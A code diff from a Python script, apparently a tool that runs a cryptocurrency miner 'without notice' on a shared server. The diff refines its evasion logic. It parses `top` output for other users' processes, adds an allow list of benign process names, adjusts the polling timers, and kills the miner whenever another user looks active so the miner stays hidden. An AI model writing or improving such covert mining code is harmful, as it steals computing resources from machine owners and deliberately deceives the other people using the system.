@@ -10,6 +10,8 @@ import getpass
 mining_is_on = False
 miner_process = None
 
+allow_list = ['zsh', 'sftp-server', 'sshd', 'sshdemd', 'sh', 'watch', 'systemd', '(sd-pam)']
+
 def get_normal_users():
     rtn = list()
     command_read = os.popen('''
@@ -34,7 +36,10 @@ def mining_without_notice(mining_url):
     global mining_is_on
     global miner_process
 
-    threading.Timer(5, mining_without_notice, [mining_url]).start()
+    if mining_is_on:
+        threading.Timer(5, mining_without_notice, [mining_url]).start()
+    else:
+        threading.Timer(30, mining_without_notice, [mining_url]).start()
 
     this_user = getpass.getuser()
     normal_users = get_normal_users()
@@ -45,15 +50,17 @@ def mining_without_notice(mining_url):
     for line in top_read:
         user_name = line.split()[1]
         status = line.split()[7]
+        process = line.split()[11]
         if user_name in normal_users and user_name != this_user:
-            if status == 'R': # the process is running
-                print('Someone else logins and running!', user_name)
+            if status == 'R' or process not in allow_list: # the process is running
+                print('Someone else logins and running!', user_name, process)
                 someone_else_detected = True
                 if mining_is_on:
                     # kill the miner
                     miner_process.kill()
                     mining_is_on = False
 
+    print('========================================================')
     # open miner
     if someone_else_detected == False and mining_is_on == False:
         print('Open miner!')
